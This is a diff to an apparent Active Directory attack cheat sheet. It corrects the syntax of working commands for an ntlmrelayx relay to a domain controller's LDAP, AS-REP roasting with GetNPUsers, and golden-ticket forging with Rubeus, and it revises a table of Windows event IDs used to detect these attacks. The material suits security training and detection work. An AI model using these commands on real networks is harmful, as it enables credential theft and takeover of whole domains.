@@ -268,7 +268,8 @@ sudo responder -I eth0 -wdF
 python3 ntlmrelayx.py -tf targets.txt -smb2support
 
 # Relay to LDAP (create new user, add to DA group)
-python3 ntlmrelayx.py -tf dc01.corp.local -smb2support --delegate-access --escalate-user COMPUTER$
+# -tf expects a file path; use -t for a single target with scheme prefix
+python3 ntlmrelayx.py -t ldap://dc01.corp.local -smb2support --delegate-access --escalate-user COMPUTER$
 
 # With --no-http-server and --no-smb-server if needed
 ```
@@ -331,8 +332,8 @@ Get-DomainUser -PreauthNotRequired | Select-Object samaccountname
 # Roast without credentials
 .\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
 
-# Impacket (can run from Linux without credentials)
-python3 GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt
+# Impacket (can run from Linux without credentials - requires -no-pass for unauthenticated)
+python3 GetNPUsers.py corp.local/ -no-pass -usersfile users.txt -format hashcat -outputfile asrep.txt
 python3 GetNPUsers.py corp.local/ -dc-ip DC01 -no-pass -usersfile users.txt
 
 # Crack
@@ -352,8 +353,8 @@ Get-DomainSID  # or whoami /user
 # Mimikatz golden ticket
 kerberos::golden /domain:corp.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /user:FakeAdmin /id:500
 
-# Rubeus
-.\Rubeus.exe golden /domain:corp.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /user:FakeAdmin /ptt
+# Rubeus (uses /rc4: for NTLM hash, not /krbtgt: which is mimikatz syntax)
+.\Rubeus.exe golden /domain:corp.local /sid:S-1-5-21-... /rc4:KRBTGT_HASH /user:FakeAdmin /ptt
 
 # Notes:
 # - Survives password reset of any account EXCEPT krbtgt
@@ -578,11 +579,12 @@ mimikatz # lsadump::dcshadow /push
 | 4720 | User account created | Persistence |
 | 4728/4732/4756 | Member added to group | Privilege escalation |
 | 4769 | TGS requested | Kerberoasting (RC4 cipher alert) |
-| 4771 | Pre-auth failure | AS-REP roasting, spray |
+| 4768 | AS-REP returned (pre-auth disabled) | AS-REP roasting (pre-auth not required) |
+| 4771 | Pre-auth failure | Password spraying (wrong password on pre-auth-required accounts) |
 | 4776 | NTLM credential validation | PtH detection |
 | 5145 | Network share access | SMB enumeration, lateral movement |
 | 7045 | Service installed | PsExec, lateral movement |
-| 8004 | Kerberos AS-REQ | Unusual AS-REQ patterns |
+| 8004 | Kerberos AS-REQ | Unusual AS-REQ patterns (Microsoft-Windows-Kerberos-Key-Distribution-Center/Operational log, not Security log) |
 
 ### Kerberoasting Detection
 
